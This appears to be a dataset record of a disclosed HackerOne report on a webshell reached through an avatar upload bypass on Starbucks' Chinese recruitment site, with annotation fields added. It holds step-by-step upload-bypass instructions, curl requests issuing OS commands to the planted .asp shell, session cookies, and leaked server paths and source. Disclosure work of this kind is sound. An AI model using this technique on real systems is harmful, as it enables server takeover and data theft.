{
  "reported_to": "Starbucks",
  "reported_by": "johnstone ",
  "title": "Webshell via File Upload on ecjobs.starbucks.com.cn",
  "content": "\nSummary:\nOS Command Injection which can let the attacker who get more important information of the server,such as disclosures internal source code of the webapp,database data and invade the internal network.\nDescription:\nI found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.\nSteps To Reproduce:\nSign in the url(https://ecjobs.starbucks.com.cn) and direct to the resume endpoint.\nUse burp suite tools to interupt the avatar upload request.\nReplace the filename type .jpg to asp which have a space character behind and modify the content\nAfter that you have uploaded malicious files on the server and run any os command on server you wanted.\nDo some command like list all files on the server\nCode 962 Bytes\n1curl -i -s -k  -X $'GET' \\\n2    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \\\n3    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \\\n4    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\\\TrustHX\\\\STBKSERM101\\\\www_app%20%2fd%2fs%2fb'\nThe response content:\nCode 683 Bytes\n1HTTP/1.1 200 OK\n2Date: Fri, 08 Mar 2019 02:56:19 GMT\n3Server: wswaf/2.13.0-5.el6\n4Content-Type: text/html\n5Cache-Control: private\n6X-Powered-By: ASP.NET\n7X-Via: 1.1 jszjsx51:1 (Cdn Cache Server V2.0), 1.1 PSjxncdx5rt58:6 (Cdn Cache Server V2.0)\n8Connection: close\n9Content-Length: 1814533\n10\n11<html>\n12<body>\n13<h1>POC by hackerone_john stone</h1>\n14<textarea readonly cols=80 rows=25>\n15d:\\TrustHX\\STBKSERM101\\www_app\\bin\n16d:\\TrustHX\\STBKSERM101\\www_app\\common\n17d:\\TrustHX\\STBKSERM101\\www_app\\concurrent_test\n18d:\\TrustHX\\STBKSERM101\\www_app\\Default.aspx\n19d:\\TrustHX\\STBKSERM101\\www_app\\Global.asax\n20d:\\TrustHX\\STBKSERM101\\www_app\\hximages_v6\n21....................................\n22</textarea>\n23</body>\n24</html>\nShow the internal source code\nCode 1006 Bytes\n1curl -i -s -k  -X $'GET' \\\n2    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \\\n3    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \\\n4    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=type%20d:\\\\TrustHX\\\\STBKSERM101\\\\www_app\\\\concurrent_test\\\\new_application_concurrent_test__svc.cs'\nthe source code respones:\nCode 1.65 KiB\n1HTTP/1.1 200 OK\n2Date: Fri, 08 Mar 2019 03:37:39 GMT\n3Server: wswaf/2.13.0-5.el6\n4Content-Type: text/html\n5Cache-Control: private\n6X-Powered-By: ASP.NET\n7X-Via: 1.1 jszjsx51:0 (Cdn Cache Server V2.0), 1.1 ydx154:3 (Cdn Cache Server V2.0)\n8Connection: close\n9Content-Length: 33316\n10\n11<html>\n12<body>\n13<h1>POC by hackerone_john stone</h1>\n14<textarea readonly cols=80 rows=25>\n15\u00ef\u00bb\u00bfusing System;\n16using System.Collections.Generic;\n17using System.ComponentModel;\n18using System.Data;\n19using System.Drawing;\n20using System.Linq;\n21using System.Text;\n22using System.Threading.Tasks;\n23using System;\n24using System.Collections.Specialized;\n25using System.Collections.Generic;\n26using System.Data;\n27using System.Configuration;\n28using System.Xml;\n29using System.Transactions;\n30using System.Text;\n31using System.Threading;\n32using System.Web;\n33\n34using TrustHX.IHXEIMS6;\n35using hxsys = TrustHX.HXEIMS6;\n36using hxwww = TrustHX.HXWWW6;\n37using hxsm = TrustHX.HXSM6;\n38using hxmd = TrustHX.HXMD6;\n39\n40\n41class new_application_concurrent_test : IHXPageXmlService\n42{\n43    #region IHXPageXmlService \u00e6\u0088\u0090\u00e5\u0091\u0098\n44    string IHXPageXmlService.Run(string strSystemCode, string strPageXmlServiceCode, string strPageXmlServiceContent, string strHXPageParamUUID, string strHXPageName)\n45    {\n46        try\n47        {\n48            switch (strPageXmlServiceCode)\n49            {\n50                case \"PREPARE_CONCURRENT_DATA\":return ConcurrentDataPrepare.ConcurrentDataPrepareProcess(strSystemCode, strPageXmlServiceContent);\n51                case \"CONCURRENT_TEST\":return ConcurrentTest.ConcurrentTestProcess(strSystemCode, strPageXmlServiceContent);\n52                default:\n53                    string strErrorMessageText =\n54....................................\n55</textarea>\n56</body>\n57</html>\nRecommendations for fix\nStrictly limit file upload types\nOnly allow jpg/png/gif/jpeg file parsing on the uploaded fiels\n*More safe code design\nThks!Looking forward to your reply.\nWith kind regards\nJohn stone\nImpact\ndisclosures the internal source code data and user's information,broken ring server,etc.\n\n",
  "severity": [
    10.0,
    null
  ],
  "bounty": 1000,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1573623480,
  "report_url": "https://hackerone.com/reports/506646",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Sign in to https://ecjobs.starbucks.com.cn and navigate to the resume endpoint."
    ],
    [
      2,
      "Intercept the avatar upload request using Burp Suite, modify the filename by adding a space after the file extension (e.g., '.asp '), and upload a malicious ASP file."
    ],
    [
      3,
      "Access the uploaded file to execute OS commands on the server, such as listing directories or viewing source code."
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to upload malicious ASP files by bypassing file type restrictions through adding a space after the file extension. This leads to arbitrary command execution on the server, potentially exposing sensitive data and internal network access.",
  "reason": "The attack involves a simple bypass technique (adding a space) and straightforward file upload manipulation. The interaction between the file upload and command execution is direct and does not require complex application state manipulation or novel logic.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves file upload bypass and command execution, which is not directly related to authentication or authorization bypass (AuthN/AuthZ) or Insecure Direct Object Reference (IDOR). The methodology described focuses on testing access control by swapping user sessions and resource IDs, whereas this vulnerability is about file upload restrictions and server-side command execution.",
    "is_detectable": false
  }
}